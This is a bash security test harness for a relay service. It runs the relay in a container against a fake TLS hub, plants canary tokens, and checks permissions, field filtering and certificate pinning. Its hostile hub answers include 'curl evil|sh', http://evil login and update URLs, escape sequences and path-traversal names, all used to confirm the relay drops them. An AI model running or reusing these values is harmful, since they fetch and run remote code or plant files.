#!/bin/bash
# Slice 1 of 07-design-v2.md (section 13): the relay with its real units, against a fake hub
# with a self-signed certificate, in a fresh throw-away container. Runs the relay rows R-1 to
# R-13, R-2b, R-11b, R-12b, N-1 and I-4 of section 12 (plus H-1 to H-4 and K-5 as far as the
# relay alone answers them). Results: slice1-results.tsv next to this script.
#
# On the host (never as root):   ./slice1.sh                 # fresh container kaptest-s1, all phases, removed after
#                                KEEP=1 ./slice1.sh          # leave the container running
#                                PHASES="tls" ./slice1.sh --reuse   # rerun phases in the running container
# REPO=<kaptyorka checkout> (default: the checkout this script is in) gives the relay, its units and the fake hub.
#
# Hard limits (07, section 13): every docker exec runs under `timeout -k 5 90`; every phase runs in
# its own transient unit (RuntimeMaxSec=80, KillMode=control-group); every helper unit (fake hubs,
# canaries) has RuntimeMaxSec and KillMode=control-group; the relay unit gets a RuntimeMaxSec=300
# drop-in for the test. No host folder is mounted. Nothing here runs as root on the host.
set -u
C=${C:-kaptest-s1}
ALL_PHASES="setup doors filter tls life attack"

if [ "${1:-}" != "--inner" ]; then
  HERE=$(cd "$(dirname "$0")" && pwd)
  REPO=${REPO:-$(cd "$HERE/../.." && pwd)}
  X() { timeout -k 5 90 docker exec "$C" "$@"; }
  phase() {
    X systemd-run --quiet --pipe --wait --collect --unit="s1-phase-$1" -p RuntimeMaxSec=80 -p KillMode=control-group \
      -p TimeoutStopSec=5 -p Environment=HOME=/root /bin/bash /root/slice1.sh --inner "$1"
    local rc=$?; if [ $rc -ne 0 ]; then echo "PHASE $1 rc=$rc (124/137 = TIMEOUT)" >&2
      X bash -c "printf 'PHASE %s\tFAIL\tphase ends rc=0\t(phase unit)\trc=%s (TIMEOUT if 124/137 or unit timeout)\n' '$1' '$rc' >> /root/results.tsv"; fi
    return 0
  }
  long_unit() { # name limit command...: run as a unit, poll until done (each poll bounded)
    local n=$1 lim=$2 i s; shift 2
    X systemd-run --quiet --unit="s1-$n" -p RuntimeMaxSec="$lim" -p KillMode=control-group -p Environment=HOME=/root \
      -p StandardOutput=file:/root/s1-$n.log -p StandardError=inherit "$@" || return 1
    for i in $(seq $((lim / 5 + 2))); do
      s=$(X systemctl show -p ActiveState --value "s1-$n.service" 2>/dev/null)
      case $s in active|activating|deactivating) sleep 5;; *) X systemctl show -p Result --value "s1-$n.service"; return 0;; esac
    done; return 1
  }
  for f in "$REPO/src/kaptyorka/relay/relay.py" "$REPO/src/kaptyorka/relay/units/kaptyorka-relay.service" \
           "$REPO/src/kaptyorka/relay/units/kaptyorka-relay-box@.socket" "$REPO/tests/fakes/relay_hub.py" "$HERE/slice1-evil-relay.py"; do
    [ -f "$f" ] || { echo "missing $f"; exit 1; }
  done
  if [ "${1:-}" != "--reuse" ]; then
    docker image inspect kaptest-box >/dev/null 2>&1 || timeout -k 5 900 docker build -t kaptest-box "$HERE" || exit 1
    timeout -k 5 90 docker rm -f "$C" >/dev/null 2>&1
    timeout -k 5 90 docker run -d --name "$C" --privileged --cgroupns=host -v /sys/fs/cgroup:/sys/fs/cgroup:rw \
      --tmpfs /run --tmpfs /run/lock kaptest-box >/dev/null || exit 1
    for i in $(seq 60); do s=$(X systemctl is-system-running 2>/dev/null); case $s in running|degraded) break;; esac; sleep 1; done
  fi
  X mkdir -p /root/s1
  for f in "$REPO/src/kaptyorka/relay/relay.py" "$REPO/src/kaptyorka/relay/units/kaptyorka-relay.service" \
           "$REPO/src/kaptyorka/relay/units/kaptyorka-relay-box@.socket" "$REPO/tests/fakes/relay_hub.py" "$HERE/slice1-evil-relay.py"; do
    timeout -k 5 90 docker cp "$f" "$C":/root/s1/ >/dev/null || exit 1
  done
  timeout -k 5 90 docker cp "$0" "$C":/root/slice1.sh >/dev/null || exit 1
  if [ "${1:-}" != "--reuse" ]; then
    X bash -c ': > /root/results.tsv'
    echo "== packages (unit, max 300 s)"; long_unit apt 300 /bin/bash /root/slice1.sh --inner apt
  fi
  for p in ${PHASES:-$ALL_PHASES}; do echo "== phase $p"; phase "$p"; done
  timeout -k 5 90 docker cp "$C":/root/results.tsv "$HERE/slice1-results.tsv" >/dev/null
  X bash -c 'cut -f2 /root/results.tsv | sort | uniq -c'
  echo "results: $HERE/slice1-results.tsv"
  if [ -z "${KEEP:-}" ] && [ "${1:-}" != "--reuse" ]; then
    timeout -k 5 90 docker rm -f "$C" >/dev/null && echo "container $C removed"
  fi
  exit 0
fi

########################################################################################
# Inside the container
########################################################################################
export DEBIAN_FRONTEND=noninteractive HOME=/root
umask 022
PH=$2
RES=/root/results.tsv
LIB=/usr/local/lib/kaptest
HUBLOG=/var/log/kaptest-hub.log
SVC=kaptyorka-relay.service
ASOCK=/run/kaptyorka/relay/alice.sock
BSOCK=/run/kaptyorka/relay/bob.sock

rec() { # id status expected command actual
  local a; a=$(printf '%s' "$5" | tr '\n\t\r' '   ' | sed 's/\x1b\[[0-9;?]*[a-zA-Z]//g; s/  */ /g' | cut -c1-500)
  local c; c=$(printf '%s' "$4" | tr '\n\t\r' '   ')
  printf '%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$c" "$a" >> "$RES"; printf '[%s] %s: %s\n' "$2" "$1" "$a"
}
# t ID "expected" CHECK 'command'     CHECK: re:REGEX | nore:REGEX | info
t() {
  local id=$1 exp=$2 chk=$3 cmd=$4 out rc st
  out=$(timeout -k 2 "${TL:-25}" bash -c "$cmd" 2>&1 </dev/null); rc=$?
  [ $rc -eq 124 ] && out="TIMEOUT $out"
  out="rc=$rc $out"
  case $chk in
    re:*)   if [[ $out =~ ${chk#re:} ]]; then st=PASS; else st=FAIL; fi;;
    nore:*) if [[ $out =~ ${chk#nore:} || $out == rc=124* ]]; then st=FAIL; else st=PASS; fi;;
    info)   st=INFO;;
  esac
  [[ $out == rc=124* ]] && st=FAIL
  rec "$id" "$st" "$exp" "$cmd" "$out"
}
# as USER SOCKET 'json line'  -> the relay's answer (or the Python error) as that user
as() { runuser -u "$1" -- /usr/bin/python3 -I $LIB/call.py "$2" "$3" 2>&1 | tail -1; }
answers() { printf '%s' "$1" > /etc/kaptest/answers.json; }
restart_relay() { systemctl stop $SVC 2>/dev/null; systemctl reset-failed $SVC 2>/dev/null; true; }
export -f as
export LIB
CALLER='"chat":"claude-code:CANARY-SESSION-5e55","project":"proj-a"'

case $PH in
apt)
  apt-get update -qq && apt-get install -y -qq --no-install-recommends strace >/dev/null && echo apt-ok
  ;;

setup)
  # docker's --tmpfs /run is private: without this systemd's LoadCredential= mounts never reach
  # the unit (a container quirk, as in slice0.sh; a real laptop's / is already shared)
  mount --make-rshared /
  # people: alice (the person, from the image), bob (another local user); box users and the share group (4.1)
  id bob >/dev/null 2>&1 || useradd -m -s /bin/bash bob
  for p in alice bob; do
    id kap-$p >/dev/null 2>&1 || useradd --system -U -s /bin/bash -d /var/lib/kap-team/kap-$p/home -M kap-$p
  done
  getent group kapshare-alice >/dev/null || groupadd kapshare-alice
  usermod -aG kapshare-alice alice; usermod -aG kapshare-alice kap-alice
  # the 4.2 layout the relay must not reach (N-1, R-4)
  mkdir -p /etc/kaptyorka/secret/alice /var/lib/kap-team/kap-alice/home /var/lib/kap-team/kap-alice/projects/proj-a /srv/team/alice /etc/kaptest $LIB
  chmod 700 /etc/kaptyorka/secret /etc/kaptyorka/secret/alice
  printf 'dev-CANARY-DEVICE-TOKEN-%s\n' "$(openssl rand -hex 16)" > /etc/kaptyorka/secret/device-token
  openssl rand -hex 32 > /etc/kaptyorka/secret/chat-key
  echo "sk-ant-oat01-CANARY-BOX-TOKEN-0000000000000000000000" > /etc/kaptyorka/secret/alice/claude-oauth-token
  chmod 600 /etc/kaptyorka/secret/device-token /etc/kaptyorka/secret/chat-key /etc/kaptyorka/secret/alice/claude-oauth-token
  chown root:kap-alice /var/lib/kap-team/kap-alice; chmod 0710 /var/lib/kap-team/kap-alice
  chown kap-alice:kap-alice /var/lib/kap-team/kap-alice/home; chmod 0700 /var/lib/kap-team/kap-alice/home
  echo CANARY-BOX-HOME-b0b0 > /var/lib/kap-team/kap-alice/home/box-canary.txt; chown kap-alice: /var/lib/kap-team/kap-alice/home/box-canary.txt
  chown kap-alice:kapshare-alice /var/lib/kap-team/kap-alice/projects /var/lib/kap-team/kap-alice/projects/proj-a
  chmod 2770 /var/lib/kap-team/kap-alice/projects /var/lib/kap-team/kap-alice/projects/proj-a
  echo CANARY-TEAM-FILE-7e7e > /var/lib/kap-team/kap-alice/projects/proj-a/team-canary.txt
  chown kap-alice:kapshare-alice /var/lib/kap-team/kap-alice/projects/proj-a/team-canary.txt; chmod 0660 /var/lib/kap-team/kap-alice/projects/proj-a/team-canary.txt
  chown root:kapshare-alice /srv/team/alice; chmod 0750 /srv/team/alice
  # alice's things: files in /tmp, /var/tmp, /dev/shm, a SysV segment, a process, a localhost server
  runuser -u alice -- bash -c 'echo CANARY-TMP-FILE-a1b2 > /tmp/alice-notes.txt; echo CANARY-VARTMP-e5f6 > /var/tmp/alice-notes.txt; echo CANARY-SHM-FILE-c3d4 > /dev/shm/alice-shm'
  systemd-run --quiet --unit=kaptest-alice-shm -p User=alice -p RuntimeMaxSec=1500 -p KillMode=control-group /usr/bin/python3 -c '
import ctypes,time; l=ctypes.CDLL(None,use_errno=True); l.shmat.restype=ctypes.c_void_p
i=l.shmget(0x7777,4096,0o1644); a=l.shmat(i,None,0); d=b"CANARY-SYSV-SHM-8e8e"; ctypes.memmove(a,d,len(d)); time.sleep(1500)'
  systemd-run --quiet --unit=kaptest-alice-sleep -p User=alice -p RuntimeMaxSec=1500 -p KillMode=control-group \
    -E CANARY_ENV=CANARY-ENV-PROC-3e1f /usr/bin/python3 -c 'import time; time.sleep(1500)' CANARY_CMDLINE_7731
  systemd-run --quiet --unit=kaptest-alice-srv -p User=alice -p RuntimeMaxSec=1500 -p KillMode=control-group /usr/bin/python3 -c '
import socket,threading
def serve(fam,addr):
    s=socket.socket(fam); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(addr); s.listen(8)
    while True:
        c,_=s.accept(); c.sendall(b"CANARY-ALICE-SERVER\n"); c.close()
threading.Thread(target=serve,args=(socket.AF_INET6,("::1",9222)),daemon=True).start()
threading.Thread(target=serve,args=(socket.AF_INET,("0.0.0.0",9223)),daemon=True).start()
serve(socket.AF_INET,("127.0.0.1",9222))'
  sleep 1
  pgrep -u alice -f CANARY_CMDLINE_7731 | head -1 > /etc/kaptest/alice-sleep.pid
  grep '\[stack\]' /proc/$(cat /etc/kaptest/alice-sleep.pid)/maps | cut -d- -f1 > /etc/kaptest/alice-addr
  ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1 > /etc/kaptest/eth
  # the fake hubs on a dummy interface: the right certificate (8443), a false one (9443), plain http (9080);
  # other listeners the relay must not reach (10.77.0.2) and one port on the hub's own address (22)
  ip link add hub0 type dummy 2>/dev/null; ip addr add 10.77.0.1/24 dev hub0 2>/dev/null; ip addr add 10.77.0.2/32 dev hub0 2>/dev/null; ip link set hub0 up
  install -m 0755 /root/s1/relay_hub.py $LIB/relay_hub.py
  cat > $LIB/call.py <<'EOF'
import socket, sys
s = socket.socket(socket.AF_UNIX); s.settimeout(20); s.connect(sys.argv[1])
s.sendall(sys.argv[2].encode() + b"\n")
data = b""
while not data.endswith(b"\n"):
    got = s.recv(65536)
    if not got: break
    data += got
print(data.decode(errors="replace").strip() or "(closed without an answer)")
EOF
  chmod 0755 $LIB/call.py
  cd /etc/kaptest
  openssl req -x509 -newkey rsa:2048 -nodes -keyout hub.key -out hub.pem -days 2 -subj /CN=hub 2>/dev/null
  openssl req -x509 -newkey rsa:2048 -nodes -keyout fake.key -out fake.pem -days 2 -subj /CN=hub 2>/dev/null
  chmod 600 hub.key fake.key
  HUBFP=$(openssl x509 -in hub.pem -outform der | sha256sum | cut -d' ' -f1)
  echo '{}' > /etc/kaptest/answers.json
  : > $HUBLOG; chmod 600 $HUBLOG
  H="systemd-run --quiet -p RuntimeMaxSec=1500 -p KillMode=control-group"
  $H --unit=kaptest-hub      /usr/bin/python3 -I $LIB/relay_hub.py --cert /etc/kaptest/hub.pem --key /etc/kaptest/hub.key --host 10.77.0.1 --port 8443 --log $HUBLOG --answers /etc/kaptest/answers.json --tag hub
  $H --unit=kaptest-falsehub /usr/bin/python3 -I $LIB/relay_hub.py --cert /etc/kaptest/fake.pem --key /etc/kaptest/fake.key --host 10.77.0.1 --port 9443 --log $HUBLOG --tag falsehub
  $H --unit=kaptest-plainhub /usr/bin/python3 -I $LIB/relay_hub.py --plain --host 10.77.0.1 --port 9080 --log $HUBLOG --tag plainhub
  $H --unit=kaptest-other    /usr/bin/python3 -c '
import socket,threading
def plain(ip,port):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind((ip,port)); s.listen(8)
    while True:
        c,_=s.accept(); c.sendall(b"OTHER-HOST-REACHED CANARY-OTHER\n"); c.close()
threading.Thread(target=plain,args=("10.77.0.2",443),daemon=True).start()
plain("10.77.0.1",22)'
  # the relay, installed as the design names it (4.2): code under /opt, units under /etc/systemd/system
  mkdir -p /opt/kaptyorka/relay/0.9.39-s1 /opt/kaptyorka/relay/evil/kt
  cp /etc/kaptest/alice-sleep.pid /etc/kaptest/eth /etc/kaptest/alice-addr /opt/kaptyorka/relay/evil/kt/
  # the relay's root folder, as the installer makes it (kap_setup.ROOTS); and extra folders of the laptop it must not see
  R0=/opt/kaptyorka/relay-root
  for d in bin dev etc/alternatives etc/kaptyorka lib lib64 opt/kaptyorka/relay proc run/kaptyorka/box-secrets sbin sys tmp usr var/tmp; do mkdir -p $R0/$d; done
  getent group kaprelay-secrets >/dev/null || groupadd --system kaprelay-secrets   # the relay's only extra group (round 3)
  touch $R0/etc/passwd $R0/etc/ld.so.cache $R0/etc/kaptyorka/relay.conf
  mkdir -p /data /kaptest-extra; echo CANARY-DATA-DISK-9a9a > /data/canary.txt; echo CANARY-TOPLEVEL-EXTRA > /kaptest-extra/secret.txt
  echo CANARY-USRLOCAL > /usr/local/kaptest-extra.txt; echo CANARY-OPT-1c1c > /opt/alice-canary.txt
  install -m 0644 /root/s1/relay.py /opt/kaptyorka/relay/0.9.39-s1/relay.py
  install -m 0644 /root/s1/slice1-evil-relay.py /opt/kaptyorka/relay/evil/relay.py
  ln -sfn /opt/kaptyorka/relay/0.9.39-s1 /opt/kaptyorka/relay/current
  printf 'hub_ip=10.77.0.1\nhub_port=8443\nhub_sha256=%s\nname=box-1\nversion=0.9.39\nidle_exit=10\n' "$HUBFP" > /etc/kaptyorka/relay.conf
  chmod 0644 /etc/kaptyorka/relay.conf
  install -m 0644 /root/s1/kaptyorka-relay.service /root/s1/kaptyorka-relay-box@.socket /etc/systemd/system/
  mkdir -p /etc/systemd/system/$SVC.d
  printf '[Service]\nIPAddressAllow=10.77.0.1\n' > /etc/systemd/system/$SVC.d/hub.conf          # the installer's drop-in
  printf '[Service]\nRuntimeMaxSec=300\n' > /etc/systemd/system/$SVC.d/50-test-limit.conf      # test only: hard end
  systemctl daemon-reload
  systemctl enable --now kaptyorka-relay-box@alice.socket kaptyorka-relay-box@bob.socket >/dev/null 2>&1
  sleep 1
  t "S1-0 units up" "sockets listening, hubs up" 're:^rc=0 active active active active active active active$' \
    "systemctl is-active kaptyorka-relay-box@alice.socket kaptyorka-relay-box@bob.socket kaptest-hub kaptest-falsehub kaptest-plainhub kaptest-other kaptest-alice-srv | tr '\n' ' ' | sed 's/ \$//'"
  t "S1-1 systemd-analyze verify the relay units" "no warnings" 're:^rc=[0-9]+ ?$' \
    "systemd-analyze verify kaptyorka-relay-box@alice.socket $SVC 2>&1 | grep -v -e '^\$' -e 'kaptest' -e 's1-phase'"
  t "S1-2 platform" "info" info 'systemctl --version | head -1; uname -r; python3 --version'
  ;;

doors)
  restart_relay
  t "R-2b door file: owner, group, mode; folder only root can write" "srw-rw---- root kap-alice; dir 755 root" \
    're:660 root kap-alice .*660 root kap-bob .*755 root root' \
    "stat -c '%a %U %G %n' $ASOCK $BSOCK /run/kaptyorka/relay"
  t "R-1/R-2b box user calls through its door (socket activation, SO_PEERCRED, RestrictAddressFamilies=AF_INET AF_INET6)" \
    "ok answer from the hub" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-1 relay runs as a dynamic user" "active yes <uid not 0>" 're:^rc=0 active yes [1-9][0-9]+$' \
    "echo \$(systemctl show -p ActiveState --value $SVC) \$(systemctl show -p DynamicUser --value $SVC) \$(ps -o uid= -p \$(systemctl show -p MainPID --value $SVC))"
  # kaprelay-secrets: its one extra group, to read the boxes' sign-in values (red team round 3)
  t "R-1 relay holds no capability and no group but its own and kaprelay-secrets" "all zero, its own gid and kaprelay-secrets" \
    're:^rc=0 groups-ok CapEff: 0+ CapBnd: 0+ NoNewPrivs: 1 Seccomp: 2$' \
    "st=/proc/\$(systemctl show -p MainPID --value $SVC)/status; want=\$( (getent group kaprelay-secrets | cut -d: -f3; awk '/^Gid:/{print \$2}' \$st) | sort -n | tr '\n' ' '); have=\$(awk '/^Groups:/{for(i=2;i<=NF;i++) print \$i}' \$st | sort -n | tr '\n' ' '); [ \"\$want\" = \"\$have\" ] && echo -n 'groups-ok ' || echo -n \"groups \$have want \$want \"; grep -E '^(CapEff|CapBnd|NoNewPrivs|Seccomp):' \$st | tr -s '\t' ' ' | tr '\n' ' ' | sed 's/ \$//'"
  t "R-2b root connects: refused by the uid check (root passes the file mode)" "refused: you are not this box's user" \
    're:refused: you are not this box' "/usr/bin/python3 -I $LIB/call.py $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-2b bob connects" "Permission denied" 're:PermissionError.*Permission denied' "as bob $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-2b alice (the person) connects" "Permission denied" 're:PermissionError.*Permission denied' "as alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-2b another box (kap-bob) on alice's door" "Permission denied" 're:PermissionError.*Permission denied' "as kap-bob $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-2b one relay, two doors: kap-bob on its own door" "ok (the same service got both sockets)" 're:^rc=0 \{"ok": true' \
    "as kap-bob $BSOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'; journalctl -u $SVC -o cat | grep -m1 'doors for'"
  t "R-2b the relay logged the refused root uid" "refused uid 0 on alice's door" "re:refused uid 0 on alice" "journalctl -u $SVC -o cat | grep refused"
  systemctl stop kaptyorka-relay-box@alice.socket; restart_relay
  t "R-2b bob tries to create the door first (door stopped)" "Permission denied, nothing made" 're:Permission denied.*Permission denied.*gone' \
    "runuser -u bob -- python3 -I -c 'import socket;s=socket.socket(socket.AF_UNIX);s.bind(\"$ASOCK\")' 2>&1 | tail -1; runuser -u bob -- mkdir -p /run/kaptyorka/relay/x 2>&1 | tail -1; [ -e $ASOCK ] || echo gone"
  systemctl start kaptyorka-relay-box@alice.socket
  t "R-2b door back after restart" "ok" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-2 hub saw the device token in the header" "Bearer dev-CANARY-DEVICE-TOKEN" "re:Authorization: Bearer dev-CANARY-DEVICE-TOKEN" "grep -a -m1 Authorization $HUBLOG"
  t "R-2 the box cannot read the device token or the relay's credentials" "Permission denied / not there" 'nore:dev-CANARY' \
    "runuser -u kap-alice -- cat /etc/kaptyorka/secret/device-token /run/credentials/$SVC/device-token /run/credentials/$SVC/chat-key 2>&1"
  # R-3: strace the honest relay through one full call: it never creates a Unix socket
  if command -v strace >/dev/null; then
    as kap-alice $ASOCK "{\"call\":\"inbox\",\"args\":{$CALLER}}" >/dev/null
    RPID=$(systemctl show -p MainPID --value $SVC)
    timeout -k 2 12 strace -f -qq -e trace=socket,connect,bind,accept4,accept -o /root/relay.strace -p "$RPID" & SP=$!; sleep 1
    as kap-alice $ASOCK "{\"call\":\"inbox\",\"args\":{$CALLER}}" >/dev/null; sleep 1; kill $SP 2>/dev/null; wait $SP 2>/dev/null
    t "R-3 honest relay creates no AF_UNIX socket, connects only to the hub" "accept on the passed door, one AF_INET socket to 10.77.0.1:8443" \
      're:accept4?\(.*socket\(AF_INET.*10\.77\.0\.1' "cat /root/relay.strace"
    t "R-3 no socket(AF_UNIX) call" "0" 're:^rc=1 0$' "grep -c 'socket(AF_UNIX' /root/relay.strace"
  else
    rec "R-3 honest relay creates no AF_UNIX socket" FAIL "strace installed" "-" "strace missing (apt phase failed)"
  fi
  # N-1: another local user and the person
  t "N-1 bob reads the secrets, the relay credentials, the box home, team folders" "Permission denied everywhere" \
    'nore:CANARY|dev-|[0-9a-f]{64}' \
    "runuser -u bob -- bash -c 'cat /etc/kaptyorka/secret/device-token /etc/kaptyorka/secret/chat-key /etc/kaptyorka/secret/alice/claude-oauth-token; ls /etc/kaptyorka/secret /run/credentials/$SVC; cat /run/credentials/$SVC/*; cat /var/lib/kap-team/kap-alice/home/box-canary.txt /var/lib/kap-team/kap-alice/projects/proj-a/team-canary.txt; ls /var/lib/kap-team/kap-alice /srv/team/alice' 2>&1"
  t "N-1 the person (alice) reads the secrets and the box home" "Permission denied" 'nore:CANARY|dev-' \
    "runuser -u alice -- bash -c 'cat /etc/kaptyorka/secret/device-token /etc/kaptyorka/secret/alice/claude-oauth-token /var/lib/kap-team/kap-alice/home/box-canary.txt /run/credentials/$SVC/device-token' 2>&1"
  t "N-1 bob reaches the relay door" "Permission denied" 're:Permission denied' "as bob $ASOCK '{\"call\":\"who\",\"args\":{$CALLER}}'"
  ;;

filter)
  : > $HUBLOG; restart_relay
  # H-3/H-4: a hostile helper sends extra fields, long fields, a path, a user name, a raw session id
  as kap-alice $ASOCK "{\"call\":\"report\",\"args\":{\"chats\":[{$CALLER,\"name\":\"title\\u001b]0;CANARY-ESC\\u0007 ok\",\"state\":\"busy\",\"last_activity\":1764140000,\"cwd\":\"/home/alice/CANARY-PATH\",\"tool\":\"claude-code\",\"user\":\"CANARY-USER\",\"hostname\":\"CANARY-HOST\",\"branch\":\"CANARY-BRANCH\",\"usage\":\"CANARY-USAGE\"}],\"machine\":\"CANARY-MACHINE\",\"facts\":{\"gpu\":\"CANARY-GPU\"}}}" > /root/f1.out
  as kap-alice $ASOCK "{\"call\":\"send\",\"args\":{$CALLER,\"to\":\"bob\",\"text\":\"hello team\",\"path\":\"/home/alice/.ssh/id_ed25519 CANARY-PATH2\",\"prompt\":\"CANARY-PROMPT\"}}" > /root/f2.out
  t "H-4 a report with extra fields: only chat, project, name, state, last_activity reach the hub" "no CANARY in the hub log; ok" \
    're:^rc=0 \{"ok": true.*\{"chats": \[\{"chat": "[0-9a-f]{16}", "project": "proj-a", "name": "title ok", "state": "busy", "last_activity": 1764140000\}\]\}' \
    "cat /root/f1.out; grep -a -o '{\"chats.*' $HUBLOG | head -1; grep -a -c CANARY $HUBLOG"
  t "H-3 nothing but the table: no path, user, host, branch, usage, raw session id at the hub" "0 matches (besides the device token header)" 're:^rc=1 0$' "grep -a CANARY $HUBLOG | grep -v -c '^Authorization: Bearer dev-CANARY-DEVICE-TOKEN'"
  t "H-3 the send body has only chat, project, to, text" "4 keys" 're:\{"chat": "[0-9a-f]{16}", "project": "proj-a", "to": "bob", "text": "hello team"\}' \
    "cat /root/f2.out; grep -a -o '{\"chat\": \"[0-9a-f]*\", \"project\": \"proj-a\", \"to\".*' $HUBLOG | head -1"
  t "H-4 a path as the project is refused, nothing sent" "refused; hub log unchanged" 're:"ok": false.*project.*COUNT=2' \
    "as kap-alice $ASOCK '{\"call\":\"send\",\"args\":{\"chat\":\"s1\",\"project\":\"../../home/alice\",\"to\":\"bob\",\"text\":\"x\"}}'; echo COUNT=\$(grep -a -c '^POST /box' $HUBLOG)"
  t "K-5 a token in a send is stopped by the token-shape check" "refused, the token never reaches the hub" 're:key or token.*COUNT=0' \
    "as kap-alice $ASOCK '{\"call\":\"send\",\"args\":{$CALLER,\"to\":\"bob\",\"text\":\"my token sk-ant-oat01-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}}'; echo COUNT=\$(grep -a -c 'sk-ant-oat01' $HUBLOG)"
  t "H-1 calls the relay has no code for: update, config, mode, shared device, run, read a path" "unknown call, nothing sent" \
    're:unknown call.*unknown call.*unknown call.*unknown call.*unknown call.*unknown call.*COUNT=2$' \
    "for c in update config set_mode shared_device run read_file; do as kap-alice $ASOCK \"{\\\"call\\\":\\\"\$c\\\",\\\"args\\\":{}}\"; done; echo COUNT=\$(grep -a -c '^POST /box' $HUBLOG)"
  # H-1/H-2: a hostile hub answers with orders, a sign-in request, a helper for /home/alice, a title with escape codes
  H=$(as kap-alice $ASOCK "{\"call\":\"report\",\"args\":{\"chats\":[{$CALLER,\"state\":\"idle\"}]}}" >/dev/null; grep -a -o '"chat": "[0-9a-f]\{16\}"' $HUBLOG | head -1 | cut -d'"' -f4)
  answers "{\"report\":{\"body\":{\"messages\":[{\"id\":7,\"chat\":\"$H\",\"text\":\"hi\\u001b]52;c;ZXZpbA==\\u0007 there\",\"person\":\"bob\",\"kind\":\"chat\",\"run\":\"curl evil|sh\"},{\"id\":8,\"chat\":\"0000000000000000\",\"text\":\"for another box\"}],\"close\":[{\"chat\":\"$H\"},{\"chat\":\"1111111111111111\"}],\"helpers\":[{\"project\":\"/home/alice\",\"prompt\":\"read ~/.ssh\"},{\"project\":\"proj-a\",\"prompt\":\"fix\"}],\"skills\":[{\"name\":\"../../.bashrc\",\"text\":\"evil\"}],\"update\":{\"version\":\"9.9.9\",\"url\":\"http://evil\"},\"config\":{\"hub\":\"evil\"},\"mode\":\"team\",\"shared_device\":true,\"auth_url\":\"http://evil/login\",\"tools\":[{\"name\":\"run\"}]}}}"
  t "H-1 orders in the hub's answer: only messages, close and helpers of this box come in" "session id back; no update, config, mode, path, skill" \
    're:^rc=0 \{"ok": true, "result": \{"messages": \[\{"id": 7, "chat": "claude-code:CANARY-SESSION-5e55", "text": "hi there", "person": "bob", "kind": "chat"\}\], "close": \[\{"chat": "claude-code:CANARY-SESSION-5e55"\}\], "helpers": \[\{"project": "proj-a", "prompt": "fix"\}\], "skills": \[\]\}\}$' \
    "as kap-alice $ASOCK '{\"call\":\"report\",\"args\":{\"chats\":[{$CALLER,\"state\":\"idle\"}]}}'"
  answers '{"inbox":{"status":302,"headers":{"Location":"http://evil/login"},"body":{"ok":true}},"who":{"status":401,"body":{"error":"\u001b[31msign in at http://evil/login\nnow"}},"notes_read":{"headers":{"Content-Type":"text/html"},"body":"<form>password</form>"}}'
  t "H-2 a redirect, a sign-in request, an HTML form from the hub" "three plain error lines" \
    're:redirect; dropped.*\(401\)", "hub_said": "sign in at http://evil/login"\}.*not JSON; dropped' \
    "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'; as kap-alice $ASOCK '{\"call\":\"who\",\"args\":{$CALLER}}'; as kap-alice $ASOCK '{\"call\":\"notes_read\",\"args\":{$CALLER,\"topic\":\"proj-a\"}}'"
  answers '{}'
  t "H-4 one call per connection, oversize line refused" "too large" 're:too large' \
    "runuser -u kap-alice -- python3 -I -c 'import socket;s=socket.socket(socket.AF_UNIX);s.connect(\"$ASOCK\");
try: s.sendall(b\"x\"*3000000)
except OSError: pass
d=s.recv(500);print(d.decode())' 2>&1"
  ;;

tls)
  : > $HUBLOG
  sed -i 's/^hub_port=.*/hub_port=9443/' /etc/kaptyorka/relay.conf; restart_relay
  t "I-4 false hub certificate" "refused, nothing sent to the false hub, mismatch logged" \
    're:certificate is not the one.*COUNT=0.*not the pinned one' \
    "as kap-alice $ASOCK '{\"call\":\"send\",\"args\":{$CALLER,\"to\":\"bob\",\"text\":\"CANARY-TO-FALSEHUB\"}}'; echo COUNT=\$(grep -a -c -e CANARY-TO-FALSEHUB -e 'dev-CANARY' -e '^POST' $HUBLOG); journalctl -u $SVC -o cat | grep -m1 'not the pinned'"
  sed -i 's/^hub_port=.*/hub_port=9080/' /etc/kaptyorka/relay.conf; restart_relay
  t "I-4 plain HTTP hub" "cannot reach the hub; no request, no token in the plain hub's log" \
    're:cannot reach the hub.*COUNT=0' \
    "as kap-alice $ASOCK '{\"call\":\"send\",\"args\":{$CALLER,\"to\":\"bob\",\"text\":\"CANARY-TO-PLAINHUB\"}}'; echo COUNT=\$(grep -a -c -e CANARY-TO-PLAINHUB -e 'dev-CANARY' -e '^POST' $HUBLOG)"
  sed -i 's/^hub_port=.*/hub_port=8443/' /etc/kaptyorka/relay.conf; restart_relay
  t "I-4 back on the pinned hub" "ok" 're:^rc=0 \{"ok": true' "as kap-alice $ASOCK '{\"call\":\"inbox\",\"args\":{$CALLER}}'"
  t "R-13 systemd-analyze security" "exposure OK or better" 're:(OK|SAFE)' "systemd-analyze security $SVC --no-pager | tail -1"
  t "R-13 hub address only from the drop-in; without it nothing is reachable" "IPAddressAllow=10.77.0.1 only" 're:IPAddressAllow=10\.77\.0\.1/32 IPAddressDeny=(::/0 0\.0\.0\.0/0|0\.0\.0\.0/0 ::/0) ?$' \
    "systemctl show $SVC -p IPAddressDeny -p IPAddressAllow | tr '\n' ' '"
  ;;

life)
  restart_relay
  as kap-alice $ASOCK "{\"call\":\"inbox\",\"args\":{$CALLER}}" >/dev/null
  t "R-14 no chat, no connection: the relay exits when idle (idle_exit=10), the door stays" "inactive; socket listening" \
    're:inactive listening' "sleep 18; echo \$(systemctl is-active $SVC) \$(systemctl show -p SubState --value kaptyorka-relay-box@alice.socket)"
